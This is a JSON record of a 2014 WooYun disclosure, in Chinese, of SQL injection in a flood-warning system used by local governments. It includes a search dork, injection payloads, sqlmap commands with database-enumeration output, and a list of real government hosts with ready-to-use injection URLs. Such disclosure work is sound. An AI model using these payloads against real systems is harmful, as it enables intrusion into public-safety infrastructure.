{"id": 50824, "wybug_id": "wooyun-2014-076687", "wybug_title": "某通用型灾害预警系统高危SQL注入漏洞", "wybug_corp": "国家应急响应中心", "wybug_author": "error", "wybug_date": "2014-09-22 11:42", "wybug_open_date": "2014-12-21 11:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向公众公开  简要描述： 影响众多地方政府的某通用型灾害预警系统存在SQL注入漏洞，可导致预警系统沦陷 详细说明：  福建四创软件开发的“山洪灾害预警监测系统”存在SQL注入漏洞，可获取数据库任意数据，进而而导致预警系统沦陷。官网：http://www.strongsoft.net/ 谷歌搜索：  intitle:预警 系统 技术支持:福建四创\n\n---------------------------------------------------------注入链接：/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=499注入参数：IDPayload1：/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+and+1=@@version--Payloa2：/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+or+'a'='a   漏洞证明：  以http://yj.yywater.gov.cn作为测试案例：1）手工注入测试http://yj.yywater.gov.cn/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+or+'a'='a \n\n报错注入：http://yj.yywater.gov.cn/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+and+1=@@version--\n\n2）SQLMAP注入测试 $ py sqlmap.py -u 'http://yj.yywater.gov.cn/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1' -p ID  --dbms mssql --level 5 --risk 3 --dbs -v 0---Place: GETParameter: ID    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: ReadOnly=&ID=-7178' OR (6641=6641) AND 'MXfX'='MXfX    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: ReadOnly=&ID=-1' AND 4173=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(103)+CHAR(102)+CHAR(113)+(SELECT (CASE WHEN (4173=4173) THEN CHAR(49) ELSE    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: ReadOnly=&ID=-1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ReadOnly=&ID=-1' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2005[01:32:55] [INFO] resumed: IStrongCMS_ZJYY[01:32:55] [INFO] resumed: master[01:32:55] [INFO] resumed: model[01:32:55] [INFO] resumed: msdb[01:32:55] [INFO] resumed: StrongMain[01:32:55] [INFO] resumed: StrongPDA[01:32:55] [INFO] resumed: StrongWater[01:32:55] [INFO] resumed: tempdbavailable databases [8]:[*] IStrongCMS_ZJYY[*] master[*] model[*] msdb[*] StrongMain[*] StrongPDA[*] StrongWater[*] tempdb\n\n\n\n3）获取管理员数据表Database: StrongMainTable: Web_SystemUser\n\n4)登录预警系统\n\n\n\n其他测试案例：http://shzh.wlfx.gov.cn//Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1%27+and+1=@@version--http://shzh.dqwater.gov.cn/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1%27+and+1=@@version-- http://218.86.6.48:3505/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+and+1=@@versio--http://yj.yywater.gov.cn/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+and+1=@@version--http://218.86.96.98:3505/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+and+1=@@version--http://222.216.218.28:8088/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+or+'a'='a http://219.159.102.99:8088/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+or+'a'='a http://111.12.51.221:8088/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+or+'a'='ahttp://183.233.205.85:9001/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+or+'a'='ahttp://222.83.214.58:8088/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+or+'a'='ahttp://180.130.175.138:3503/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+or+'a'='ahttp://219.159.239.96:8088/Plan/FloodPlan/FileEdit.aspx?ReadOnly=&ID=-1'+or+'a'='a   修复方案：  过滤   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-09-26 10:33 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}